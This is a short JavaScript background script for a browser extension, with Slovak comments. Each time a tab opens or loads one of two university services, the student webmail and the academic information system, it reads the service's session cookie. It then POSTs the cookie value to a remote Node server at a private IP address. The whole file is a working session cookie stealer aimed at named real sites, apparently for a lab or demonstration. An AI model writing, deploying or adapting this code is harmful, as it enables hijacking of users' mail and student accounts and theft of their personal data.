const SERVER_URL = "http://10.0.2.16:3000/sessid"; // IP Node server

// konfiguracia sledovanych cookies a domen
const TARGETS = [
    {
        urlPrefix: "https://studentmail.ukf.sk/",
        cookieName: "roundcube_sessid"
    },
    {
        urlPrefix: "https://ais2.ukf.sk/ais/",
        cookieName: "JSESSIONID"
    }
];

// funkcia na ziskanie cookies
function readCookie(target) {
    chrome.cookies.get(
        {
            url: target.urlPrefix,
            name: target.cookieName
        },
        (cookie) => {
            if (!cookie) {
                console.log(`[INFO] Cookie ${target.cookieName} not found for ${target.urlPrefix}`);
                return;
            }

            sendToServer(target.cookieName, cookie.value);
        }
    );
}

// odosielanie cookies na Node server 
function sendToServer(cookieName, value) {
    fetch(SERVER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            cookie: cookieName,
            value: value,
            timestamp: Date.now()
        })
    })
    .then(() => console.log(`[OK] Sent ${cookieName}:`, value))
    .catch(err => console.error("[ERROR] Sending failed:", err));
}

// spracovanie tabov
function handleTab(tab) {
    if (!tab || !tab.url) return;

    for (const target of TARGETS) {
        if (tab.url.startsWith(target.urlPrefix)) {
            readCookie(target);
        }
    }
}

// sledovanie zmeny tabov
chrome.tabs.onActivated.addListener(info => {
    chrome.tabs.get(info.tabId, handleTab);
});

// kontrola refreshu alebo zmeny URL 
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === "complete") {
        handleTab(tab);
    }
});
